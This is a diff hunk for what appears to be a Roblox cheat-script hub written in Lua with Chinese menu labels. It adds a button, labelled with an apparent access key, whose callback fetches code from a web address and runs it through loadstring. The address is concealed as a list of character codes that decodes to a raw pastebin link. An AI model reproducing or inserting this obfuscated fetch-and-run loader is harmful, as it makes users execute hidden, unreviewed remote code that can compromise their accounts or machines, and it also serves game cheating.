@@ -697,6 +697,12 @@ Tab:AddButton({
   end
 })
 
+Tab:AddButton({
+  Name = "BS脚本卡密:195154ajd",
+  Callback = function()
+    loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,71,57,103,117,122,88,100,75})end)())))()--BS
+  end
+})
 local Tab = Window:MakeTab({
     Name = "特殊脚本（可能无效）",
 	Icon = "rbxassetid://4483345998",
